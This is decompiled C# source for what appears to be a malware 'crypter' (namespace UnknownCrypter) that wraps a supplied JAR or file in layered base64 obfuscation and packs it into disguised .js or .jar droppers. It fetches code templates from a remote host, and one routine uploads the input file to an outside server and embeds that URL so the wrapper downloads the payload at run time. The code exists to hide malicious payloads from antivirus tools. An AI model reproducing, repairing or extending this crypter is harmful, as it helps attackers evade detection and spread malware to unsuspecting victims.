using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Ionic.Zip;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using UnknownCrypter;

public class GClass1
{
	private string string_0;

	private string string_1;

	private string string_2;

	private Form3.GDelegate0 gdelegate0_0;

	private Form3.GDelegate1 gdelegate1_0;

	private Form3.GDelegate2 gdelegate2_0;

	private string string_3;

	private Dictionary<string, string> dictionary_0;

	private string string_4;

	private Random random_0;

	public GClass1(string jarFilePath, string outputFilePath, string mutex, Form3.GDelegate0 callback, Form3.GDelegate1 progressReport, Form3.GDelegate2 done, string icon, Dictionary<string, string> assinfo, string signature)
	{
		random_0 = new Random();
		string_0 = jarFilePath;
		string_1 = outputFilePath;
		string_2 = mutex;
		gdelegate0_0 = callback;
		gdelegate1_0 = progressReport;
		gdelegate2_0 = done;
		string_3 = icon;
		dictionary_0 = assinfo;
		string_4 = signature;
	}

	public void method_0()
	{
		if (File.Exists(string_0) | string_0.StartsWith("http"))
		{
			if (Class1.MyForms_0.Form1_0.bool_0)
			{
				if (Form3.bool_1)
				{
					Thread thread = new Thread(method_3);
					thread.Start();
				}
				else
				{
					Thread thread2 = new Thread(method_1);
					thread2.Start();
				}
			}
			else if (Form3.bool_1)
			{
				Thread thread3 = new Thread(method_3);
				thread3.Start();
			}
			else
			{
				Thread thread4 = new Thread(method_1);
				thread4.Start();
			}
		}
		else
		{
			Interaction.MsgBox("File not found");
		}
	}

	private void method_1()
	{
		try
		{
			gdelegate1_0(new int[2] { 2, 5 });
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("http://kingmummylive.com/getstamp.php") + method_9() + ".upload";
			_ = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text;
			gdelegate1_0(new int[2] { 2, 30 });
			string text2 = webClient.DownloadString("http://kingmummylive.com/jar2jar_p.code");
			gdelegate1_0(new int[2] { 2, 50 });
			string text3 = method_9();
			string text4 = "M" + method_9();
			string newValue = "M" + method_9();
			text2 = text2.Replace("[pkgname]", text3);
			text2 = text2.Replace("[classname]", text4);
			text2 = text2.Replace("[classname2]", newValue);
			text2 = text2.Replace("[url]", string_0);
			string text5 = Application.StartupPath + "\\compiler\\bin\\";
			Directory.CreateDirectory(text5 + text3);
			File.WriteAllText(text5 + text3 + "\\" + text4 + ".java", text2);
			webClient.DownloadFile("http://kingmummylive.com/dummy.code", text5 + text3 + "\\data.class");
			gdelegate1_0(new int[2] { 2, 70 });
			if (!GClass0.smethod_0(text5 + text3 + "\\" + text4 + ".java"))
			{
				gdelegate1_0(new int[2] { 2, 100 });
				gdelegate2_0(2);
				gdelegate0_0("Crypting Failed!");
				return;
			}
			string contents = "Manifest-Version: 1.0\r\nMain-Class: " + text3 + "." + text4 + "\r\n\r\n";
			File.WriteAllText(text5 + text3 + "\\manifest.txt", contents);
			string text6 = text5 + text3 + "\\";
			string text7 = "-cvfm " + text3 + "\\tmp.jar " + text3 + "\\manifest.txt " + text3 + "\\*.class";
			GClass0.smethod_1(text7);
			Thread.Sleep(1000);
			if (File.Exists(text6 + "tmp.jar"))
			{
				if (string_1.EndsWith(".jar"))
				{
					File.Copy(text6 + "tmp.jar", string_1);
					Directory.Delete(text5 + text3, recursive: true);
					gdelegate1_0(new int[2] { 2, 100 });
					gdelegate2_0(2);
					gdelegate0_0("File crypted successfully.");
					return;
				}
				byte[] inArray = File.ReadAllBytes(text6 + "tmp.jar");
				string text8 = Convert.ToBase64String(inArray);
				string newValue2 = text8.Replace("A", string_2);
				string text9 = Form3.string_1.Replace("[mutex]", string_2);
				text9 = text9.Replace("[64code]", newValue2);
				WebClient webClient2 = new WebClient();
				string text10 = webClient2.DownloadString("http://kingmummylive.com/js.any.name");
				if (Operators.CompareString(text10, "", TextCompare: false) == 0)
				{
					gdelegate0_0("ERROR: Fatal Error");
					gdelegate2_0(2);
					return;
				}
				byte[] bytes = Encoding.ASCII.GetBytes(text10);
				string text11 = Convert.ToBase64String(bytes);
				text11 = text11.Replace("A", string_2);
				string text12 = Form3.string_0.Replace("[mutex]", string_2);
				text12 = text12.Replace("[A]", "A");
				text12 = text12.Replace("[64code]", text11);
				bytes = Encoding.ASCII.GetBytes(text12);
				text12 = Convert.ToBase64String(bytes);
				string text13 = webClient2.DownloadString("http://kingmummylive.com/js.java.bakd");
				if (Operators.CompareString(text13, "", TextCompare: false) == 0)
				{
					gdelegate0_0("ERROR: Fatal Error");
					gdelegate2_0(2);
					return;
				}
				string text14 = text13.Replace("[64code]", text12);
				text14 = text14.Replace("[random]", method_5());
				text9 = text14 + "\r\n" + text9;
				byte[] bytes2 = Encoding.ASCII.GetBytes(text9);
				string text15 = Convert.ToBase64String(bytes2);
				text15 = text15.Replace("m", string_2);
				text9 = Form3.string_0.Replace("[mutex]", string_2);
				text9 = text9.Replace("[A]", "m");
				text9 = text9.Replace("[64code]", text15);
				File.WriteAllText(string_1, text9);
				Directory.Delete(text5 + text3, recursive: true);
				gdelegate1_0(new int[2] { 2, 100 });
				gdelegate2_0(2);
				gdelegate0_0("File crypted successfully.");
			}
			else
			{
				gdelegate0_0("Unable to complete compiling.");
				gdelegate1_0(new int[2] { 2, 100 });
				gdelegate2_0(2);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			gdelegate1_0(new int[2] { 2, 100 });
			gdelegate2_0(2);
			gdelegate0_0("ERROR: Exception was thrown");
			ProjectData.ClearProjectError();
		}
	}

	private void method_2()
	{
		try
		{
			gdelegate1_0(new int[2] { 2, 5 });
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("http://kingmummylive.com/getstamp.php") + method_9() + ".upload";
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text;
			File.Copy(string_0, text2);
			Class1.Class0_0.Network.UploadFile(text2, "https://posta.co.tz/unk/index.php");
			string newValue = "https://posta.co.tz/unk/" + text;
			gdelegate1_0(new int[2] { 2, 30 });
			string text3 = webClient.DownloadString("http://kingmummylive.com/jar2jar_p.code");
			gdelegate1_0(new int[2] { 2, 50 });
			string text4 = method_9();
			string text5 = "M" + method_9();
			string newValue2 = "M" + method_9();
			text3 = text3.Replace("[pkgname]", text4);
			text3 = text3.Replace("[classname]", text5);
			text3 = text3.Replace("[classname2]", newValue2);
			text3 = text3.Replace("[url]", newValue);
			string text6 = Application.StartupPath + "\\compiler\\bin\\";
			Directory.CreateDirectory(text6 + text4);
			File.WriteAllText(text6 + text4 + "\\" + text5 + ".java", text3);
			webClient.DownloadFile("http://kingmummylive.com/dummy.code", text6 + text4 + "\\data.class");
			gdelegate1_0(new int[2] { 2, 70 });
			if (!GClass0.smethod_0(text6 + text4 + "\\" + text5 + ".java"))
			{
				gdelegate1_0(new int[2] { 2, 100 });
				gdelegate2_0(2);
				gdelegate0_0("Crypting Failed!");
				return;
			}
			string contents = "Manifest-Version: 1.0\r\nMain-Class: " + text4 + "." + text5 + "\r\n\r\n";
			File.WriteAllText(text6 + text4 + "\\manifest.txt", contents);
			string text7 = text6 + text4 + "\\";
			string text8 = "-cvfm " + text4 + "\\tmp.jar " + text4 + "\\manifest.txt " + text4 + "\\*.class";
			GClass0.smethod_1(text8);
			Thread.Sleep(1000);
			if (File.Exists(text7 + "tmp.jar"))
			{
				if (string_1.EndsWith(".jar"))
				{
					File.Copy(text7 + "tmp.jar", string_1);
					Directory.Delete(text6 + text4, recursive: true);
					gdelegate1_0(new int[2] { 2, 100 });
					gdelegate2_0(2);
					gdelegate0_0("File crypted successfully.");
					return;
				}
				byte[] inArray = File.ReadAllBytes(text7 + "tmp.jar");
				string text9 = Convert.ToBase64String(inArray);
				string newValue3 = text9.Replace("A", string_2);
				string text10 = Form3.string_1.Replace("[mutex]", string_2);
				text10 = text10.Replace("[64code]", newValue3);
				WebClient webClient2 = new WebClient();
				string text11 = webClient2.DownloadString("http://kingmummylive.com/js.any.name");
				if (Operators.CompareString(text11, "", TextCompare: false) == 0)
				{
					gdelegate0_0("ERROR: Fatal Error");
					gdelegate2_0(2);
					return;
				}
				byte[] bytes = Encoding.ASCII.GetBytes(text11);
				string text12 = Convert.ToBase64String(bytes);
				text12 = text12.Replace("A", string_2);
				string text13 = Form3.string_0.Replace("[mutex]", string_2);
				text13 = text13.Replace("[A]", "A");
				text13 = text13.Replace("[64code]", text12);
				bytes = Encoding.ASCII.GetBytes(text13);
				text13 = Convert.ToBase64String(bytes);
				string text14 = webClient2.DownloadString("http://kingmummylive.com/js.java.bakd");
				if (Operators.CompareString(text14, "", TextCompare: false) == 0)
				{
					gdelegate0_0("ERROR: Fatal Error");
					gdelegate2_0(2);
					return;
				}
				string text15 = text14.Replace("[64code]", text13);
				text15 = text15.Replace("[random]", method_5());
				text10 = text15 + "\r\n" + text10;
				byte[] bytes2 = Encoding.ASCII.GetBytes(text10);
				string text16 = Convert.ToBase64String(bytes2);
				text16 = text16.Replace("m", string_2);
				text10 = Form3.string_0.Replace("[mutex]", string_2);
				text10 = text10.Replace("[A]", "m");
				text10 = text10.Replace("[64code]", text16);
				File.WriteAllText(string_1, text10);
				Directory.Delete(text6 + text4, recursive: true);
				gdelegate1_0(new int[2] { 2, 100 });
				gdelegate2_0(2);
				gdelegate0_0("File crypted successfully.");
			}
			else
			{
				gdelegate0_0("Unable to complete compiling.");
				gdelegate1_0(new int[2] { 2, 100 });
				gdelegate2_0(2);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			gdelegate1_0(new int[2] { 2, 100 });
			gdelegate2_0(2);
			gdelegate0_0("ERROR: Exception was thrown");
			ProjectData.ClearProjectError();
		}
	}

	private void method_3()
	{
		try
		{
			byte[] array = File.ReadAllBytes(string_0);
			if (array.Length > 1048576)
			{
				gdelegate0_0("File size too large. Cannot exceed 1MB");
				return;
			}
			gdelegate1_0(new int[2] { 2, 5 });
			string text = Convert.ToBase64String(array);
			string newValue = text.Replace("A", string_2);
			string text2 = Form3.string_1.Replace("[mutex]", string_2);
			text2 = text2.Replace("[64code]", newValue);
			WebClient webClient = new WebClient();
			string text3 = webClient.DownloadString("http://kingmummylive.com/js.any.name");
			if (Operators.CompareString(text3, "", TextCompare: false) == 0)
			{
				gdelegate0_0("ERROR: Fatal Error");
				gdelegate2_0(2);
				return;
			}
			byte[] bytes = Encoding.ASCII.GetBytes(text3);
			string text4 = Convert.ToBase64String(bytes);
			text4 = text4.Replace("A", string_2);
			string text5 = Form3.string_0.Replace("[mutex]", string_2);
			text5 = text5.Replace("[A]", "A");
			text5 = text5.Replace("[64code]", text4);
			bytes = Encoding.ASCII.GetBytes(text5);
			text5 = Convert.ToBase64String(bytes);
			string text6 = webClient.DownloadString("http://kingmummylive.com/js.java.bakd");
			if (Operators.CompareString(text6, "", TextCompare: false) == 0)
			{
				gdelegate0_0("ERROR: Fatal Error");
				gdelegate2_0(2);
				return;
			}
			string text7 = text6.Replace("[64code]", text5);
			text7 = text7.Replace("[random]", method_5());
			text2 = text7 + "\r\n" + text2;
			byte[] bytes2 = Encoding.ASCII.GetBytes(text2);
			string text8 = Convert.ToBase64String(bytes2);
			text8 = text8.Replace("m", string_2);
			text2 = Form3.string_0.Replace("[mutex]", string_2);
			text2 = text2.Replace("[A]", "m");
			text2 = text2.Replace("[64code]", text8);
			gdelegate1_0(new int[2] { 2, 20 });
			if (string_1.EndsWith(".js"))
			{
				File.WriteAllText(string_1, text2);
				gdelegate1_0(new int[2] { 2, 100 });
				gdelegate2_0(2);
				gdelegate0_0("File crypted successfully.");
			}
			else
			{
				if (!string_1.EndsWith(".jar"))
				{
					return;
				}
				new WebClient();
				string text9 = Form3.string_4;
				gdelegate1_0(new int[2] { 2, 70 });
				string text10 = method_9();
				string text11 = "M" + method_9();
				string newValue2 = "M" + method_9();
				string newValue3 = "M" + method_9();
				string newValue4 = "M" + method_9();
				string newValue5 = method_9();
				string text12 = method_9();
				text9 = text9.Replace("[pkgname]", text10);
				text9 = text9.Replace("[classname]", text11);
				text9 = text9.Replace("[classname2]", newValue2);
				text9 = text9.Replace("[classname3]", newValue3);
				text9 = text9.Replace("[classname4]", newValue4);
				text9 = text9.Replace("[outname]", newValue5);
				text9 = text9.Replace("[resourcename]", text12);
				string text13 = Application.StartupPath + "\\compiler\\bin\\";
				string text14 = text13 + "tmp\\";
				if (Directory.Exists(text14))
				{
					Directory.Delete(text14, recursive: true);
					Directory.CreateDirectory(text14);
				}
				else
				{
					Directory.CreateDirectory(text14);
				}
				File.WriteAllText(text14 + text11 + ".java", text9);
				if (!GClass0.smethod_0(text14 + text11 + ".java"))
				{
					gdelegate1_0(new int[2] { 2, 100 });
					gdelegate2_0(2);
					gdelegate0_0("Crypting Failed!");
					return;
				}
				File.Delete(text14 + text11 + ".java");
				string contents = "Manifest-Version: 1.0\r\nMain-Class: " + text10 + "." + text11 + "\r\n\r\n";
				string text15 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text11;
				if (Directory.Exists(text15))
				{
					Directory.Delete(text15, recursive: true);
				}
				Directory.CreateDirectory(text15);
				Directory.CreateDirectory(text15 + "\\META-INF");
				Directory.CreateDirectory(text15 + "\\" + text10);
				Directory.CreateDirectory(text15 + "\\" + text10 + "\\resources");
				File.WriteAllText(text15 + "\\" + text10 + "\\resources\\" + text12, text2);
				File.WriteAllText(text15 + "\\META-INF\\MANIFEST.MF", contents);
				foreach (string file in Class1.Class0_0.FileSystem.GetFiles(text14))
				{
					if (file.EndsWith(".class"))
					{
						File.Copy(file, text15 + "\\" + text10 + "\\" + Path.GetFileName(file));
					}
				}
				Directory.Delete(text14, recursive: true);
				using (ZipFile zipFile = new ZipFile())
				{
					zipFile.AddFile(text15 + "\\" + text10 + "\\resources\\" + text12, text10 + "\\resources\\");
					zipFile.AddFile(text15 + "\\META-INF\\MANIFEST.MF", "META-INF\\");
					foreach (string file2 in Class1.Class0_0.FileSystem.GetFiles(text15 + "\\" + text10))
					{
						if (file2.EndsWith(".class"))
						{
							zipFile.AddFile(file2, text10 + "\\");
						}
					}
					zipFile.Save(string_1);
				}
				Directory.Delete(text15, recursive: true);
				gdelegate1_0(new int[2] { 2, 100 });
				gdelegate2_0(2);
				gdelegate0_0("File crypted successfully.");
				return;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			gdelegate1_0(new int[2] { 2, 100 });
			gdelegate2_0(2);
			gdelegate0_0("ERROR: Exception was thrown");
			ProjectData.ClearProjectError();
		}
	}

	private void method_4()
	{
		try
		{
			byte[] array = File.ReadAllBytes(string_0);
			if (array.Length > 1048576)
			{
				gdelegate0_0("File size too large. Cannot exceed 1MB");
				return;
			}
			gdelegate1_0(new int[2] { 2, 5 });
			string text = Convert.ToBase64String(array);
			string newValue = text.Replace("A", string_2);
			string text2 = Form3.string_1.Replace("[mutex]", string_2);
			text2 = text2.Replace("[64code]", newValue);
			WebClient webClient = new WebClient();
			string text3 = webClient.DownloadString("http://kingmummylive.com/js.any.name");
			if (Operators.CompareString(text3, "", TextCompare: false) == 0)
			{
				gdelegate0_0("ERROR: Fatal Error");
				gdelegate2_0(2);
				return;
			}
			byte[] bytes = Encoding.ASCII.GetBytes(text3);
			string text4 = Convert.ToBase64String(bytes);
			text4 = text4.Replace("A", string_2);
			string text5 = Form3.string_0.Replace("[mutex]", string_2);
			text5 = text5.Replace("[A]", "A");
			text5 = text5.Replace("[64code]", text4);
			bytes = Encoding.ASCII.GetBytes(text5);
			text5 = Convert.ToBase64String(bytes);
			string text6 = webClient.DownloadString("http://kingmummylive.com/js.java.bakd");
			if (Operators.CompareString(text6, "", TextCompare: false) == 0)
			{
				gdelegate0_0("ERROR: Fatal Error");
				gdelegate2_0(2);
				return;
			}
			string text7 = text6.Replace("[64code]", text5);
			text7 = text7.Replace("[random]", method_5());
			text2 = text7 + "\r\n" + text2;
			byte[] bytes2 = Encoding.ASCII.GetBytes(text2);
			string text8 = Convert.ToBase64String(bytes2);
			text8 = text8.Replace("m", string_2);
			text2 = Form3.string_0.Replace("[mutex]", string_2);
			text2 = text2.Replace("[A]", "m");
			text2 = text2.Replace("[64code]", text8);
			gdelegate1_0(new int[2] { 2, 20 });
			if (string_1.EndsWith(".js"))
			{
				File.WriteAllText(string_1, text2);
				gdelegate1_0(new int[2] { 2, 100 });
				gdelegate2_0(2);
				gdelegate0_0("File crypted successfully.");
			}
			else
			{
				if (!string_1.EndsWith(".jar"))
				{
					return;
				}
				new WebClient();
				string text9 = Form3.string_4;
				gdelegate1_0(new int[2] { 2, 70 });
				string text10 = method_9();
				string text11 = "M" + method_9();
				string newValue2 = method_9();
				string text12 = method_9();
				text9 = text9.Replace("[pkgname]", text10);
				text9 = text9.Replace("[classname]", text11);
				text9 = text9.Replace("[outname]", newValue2);
				text9 = text9.Replace("[resourcename]", text12);
				string text13 = Application.StartupPath + "\\compiler\\bin\\";
				File.WriteAllText(text13 + text11 + ".java", text9);
				if (!GClass0.smethod_0(text13 + text11 + ".java"))
				{
					gdelegate1_0(new int[2] { 2, 100 });
					gdelegate2_0(2);
					gdelegate0_0("Crypting Failed!");
					return;
				}
				File.Delete(text13 + text11 + ".java");
				string contents = "Manifest-Version: 1.0\r\nMain-Class: " + text10 + "." + text11 + "\r\n\r\n";
				string text14 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text11;
				if (Directory.Exists(text14))
				{
					Directory.Delete(text14, recursive: true);
				}
				Directory.CreateDirectory(text14);
				Directory.CreateDirectory(text14 + "\\META-INF");
				Directory.CreateDirectory(text14 + "\\" + text10);
				Directory.CreateDirectory(text14 + "\\" + text10 + "\\resources");
				File.WriteAllText(text14 + "\\" + text10 + "\\resources\\" + text12, text2);
				File.WriteAllText(text14 + "\\META-INF\\MANIFEST.MF", contents);
				File.Copy(text13 + text11 + ".class", text14 + "\\" + text10 + "\\" + text11 + ".class");
				File.Delete(text13 + text11 + ".class");
				using (ZipFile zipFile = new ZipFile())
				{
					zipFile.AddFile(text14 + "\\" + text10 + "\\resources\\" + text12, text10 + "\\resources\\");
					zipFile.AddFile(text14 + "\\META-INF\\MANIFEST.MF", "META-INF\\");
					zipFile.AddFile(text14 + "\\" + text10 + "\\" + text11 + ".class", text10 + "\\");
					zipFile.Save(string_1);
				}
				Directory.Delete(text14, recursive: true);
				gdelegate1_0(new int[2] { 2, 100 });
				gdelegate2_0(2);
				gdelegate0_0("File crypted successfully.");
				return;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			gdelegate1_0(new int[2] { 2, 100 });
			gdelegate2_0(2);
			gdelegate0_0("ERROR: Exception was thrown");
			ProjectData.ClearProjectError();
		}
	}

	public string method_5()
	{
		string text = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		int num = 1;
		do
		{
			int index = random.Next(0, text.Length);
			char value = text[index];
			stringBuilder.Append(value);
			num = checked(num + 1);
		}
		while (num <= 10);
		return stringBuilder.ToString();
	}

	private string method_6(string string_5, string string_6)
	{
		string text = "Dim " + string_5 + " As String = \"\"\r\n";
		while (string_6.Length > 100)
		{
			text = text + string_5 + " &= \"" + string_6.Substring(0, 100) + "\"\r\n";
			string_6 = string_6.Substring(100);
		}
		return text + string_5 + " &= \"" + string_6.Substring(0) + "\"\r\n";
	}

	private string method_7(string string_5, string string_6)
	{
		string text = "String " + string_5 + " = \"\";\r\n";
		while (string_6.Length > 100)
		{
			text = text + string_5 + " += \"" + string_6.Substring(0, 100) + "\";\r\n";
			string_6 = string_6.Substring(100);
		}
		return text + string_5 + " += \"" + string_6.Substring(0) + "\";\r\n";
	}

	public bool method_8(string string_5, string string_6)
	{
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(Type.GetTypeFromProgID("Shell.Application")));
			if (Directory.Exists(string_6))
			{
				Directory.Delete(string_6, recursive: true);
			}
			Directory.CreateDirectory(string_6);
			object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "NameSpace", new object[1] { string_6 }, null, null, null));
			object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "NameSpace", new object[1] { string_5 }, null, null, null));
			NewLateBinding.LateCall(objectValue2, null, "CopyHere", new object[2]
			{
				RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue3, null, "Items", new object[0], null, null, null)),
				4
			}, null, null, null, IgnoreReturn: true);
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public string method_9()
	{
		string text = "abcdefghijklmnopqrstuvwxyz";
		StringBuilder stringBuilder = new StringBuilder();
		int num = 1;
		do
		{
			int index = random_0.Next(0, text.Length);
			char value = text[index];
			stringBuilder.Append(value);
			num = checked(num + 1);
		}
		while (num <= 10);
		return stringBuilder.ToString();
	}
}
